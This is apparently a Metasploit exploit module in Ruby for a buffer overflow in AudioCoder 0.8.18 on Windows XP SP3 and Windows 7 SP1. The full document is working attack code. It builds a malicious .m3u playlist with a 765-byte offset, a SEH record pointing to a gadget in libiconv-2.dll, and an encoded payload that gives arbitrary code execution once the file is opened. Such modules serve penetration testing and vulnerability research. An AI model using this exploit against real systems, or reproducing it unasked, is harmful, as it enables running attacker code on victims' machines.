 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AudioCoder .M3U Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in Audio Code 0.8.18. The vulnerability
        occurs when adding an .m3u, allowing arbitrary code execution with the privileges
        of the user running AudioCoder. This module has been tested successfully on
        AudioCoder 0.8.18.5353 over Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;metacom&#039;, # Vulnerability discovery and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;92939&#039; ],
          [ &#039;EDB&#039;, &#039;25141&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 6596,
          &#039;BadChars&#039;        => "\x00\x5c\x40\x0d\x0a",
          &#039;DisableNops&#039;     => true,
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;AudioCoder 0.8.18.5353 / Windows XP SP3 / Windows 7 SP1&#039;,
            {
              &#039;Ret&#039;     => 0x66011b56, # ppr from libiconv-2.dll
              &#039;Offset&#039;  => 765
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 01 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.m3u&#039;]),
      ], self.class)
 
  end
 
  def exploit
    buffer = "http://"
    buffer << rand_text(target[&#039;Offset&#039;])
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded
 
    file_create(buffer)
  end
end

